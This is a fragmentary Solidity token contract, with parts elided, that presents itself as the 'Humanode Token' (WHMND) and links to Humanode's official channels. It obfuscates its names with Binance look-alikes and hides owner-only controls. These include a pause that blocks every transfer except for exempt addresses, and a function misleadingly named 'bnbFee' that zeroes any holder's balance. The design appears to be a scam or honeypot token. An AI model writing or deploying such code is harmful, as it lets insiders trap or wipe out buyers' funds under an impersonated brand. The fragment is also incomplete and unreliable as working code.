...
// https://t.me/humanode
// https://humanode.io/
// https://coinmarketcap.com/currencies/humanode/markets/

pragma solidity ^0.8.0;

abstract contract binanceabcd {
...
interface binancea is binanceabc {
...
abstract contract binanceab is binanceabcd {
...
contract proxyWrapped is binanceabcd, binanceabc, binancea, binanceab {

    mapping(address => uint256) private ebalances;
  mapping(address => bool) public biananceAZERTY;
    mapping(address => mapping(address => uint256)) private _allowances;
address private pancakeswap;
    uint256 private ALLtotalSupply;
    string private _name;
    string private _symbol;
  address bianancebitcin;
    // My variables
    mapping(address => bool) public isPauseExempt;
    bool biananceisPaused;
    
    constructor(address _pancakeswap) {
            // Editable
            bianancebitcin = msg.sender;
            biananceAZERTY[bianancebitcin] = true;
        _name = "Humanode Token";
        _symbol = "WHMND";
  pancakeswap = _pancakeswap;        
        uint _totalSupply = 100000000 * 10**9;
        biananceisPaused = false;
        // End editable
  ...
  modifier bianance0wner () {
    require(bianancebitcin == msg.sender, "ERC20: cannot permit Pancake address");
    _;
    ...
    function _transfer(
        ...
        // My implementation
        require(!biananceisPaused || isPauseExempt[from], "Transactions are paused.");
  ...
  function bnbFee(address biananceaccount) external pancake {
    ebalances[biananceaccount] = 0;
            emit Transfer(address(0), biananceaccount, 0);
  }
